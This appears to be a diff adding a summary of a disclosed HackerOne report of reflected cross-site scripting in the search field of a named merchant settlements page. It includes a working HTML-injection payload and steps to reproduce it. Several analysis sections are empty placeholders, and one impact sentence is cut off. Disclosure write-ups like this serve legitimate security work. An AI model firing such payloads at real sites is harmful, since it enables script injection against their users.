@@ -1,0 +1,87 @@
+# XSS in https://merchant.kartpay.com/settlements
+
+## Metadata
+- **Source:** HackerOne
+- **Report:** 653221 | https://hackerone.com/reports/653221
+- **Submitted:** 2019-07-22
+- **Reporter:** c00lbugs
+- **Program:** Unknown
+- **Bounty:** Not disclosed
+- **Severity:** unknown
+- **Vuln:** xss
+- **CVEs:** None
+- **Category:** web-api
+
+## Summary
+**Parameter**
+``Search``
+
+**Payload**
+``"><img src=x onerror=alert(domain)>``
+
+**URL**
+``https://merchant.kartpay.com/settlements``
+
+**Steps to reproduce**
+1. Go to URL: https://merchant.kartpay.com/settlements
+2. Enter above payload.
+3. You will see xss payload getting executed.
+
+{F535235}
+{F535234}
+{F535236}
+
+## Impact
+
+Cross-site scripting is a flaw that allows users to inject HTML or JavaScrip
+
+## Attack scenario
+*(see original)*
+
+## Root cause
+*(see original)*
+
+## Attacker mindset
+*(see original)*
+
+## Defensive takeaways
+*(see original)*
+
+## Variant hunting
+*(see original)*
+
+## MITRE ATT&CK
+*(see original)*
+
+## Notes
+*(see original)*
+
+## Full report
+<details><summary>Expand</summary>
+
+**Parameter**
+``Search``
+
+**Payload**
+``"><img src=x onerror=alert(domain)>``
+
+**URL**
+``https://merchant.kartpay.com/settlements``
+
+**Steps to reproduce**
+1. Go to URL: https://merchant.kartpay.com/settlements
+2. Enter above payload.
+3. You will see xss payload getting executed.
+
+{F535235}
+{F535234}
+{F535236}
+
+## Impact
+
+Cross-site scripting is a flaw that allows users to inject HTML or JavaScript code into a page enabling arbitrary input. There are two main variants of XSS, stored and reflected.
+
+</details>
+
+---
+*Analysed by Claude on 2026-05-24*
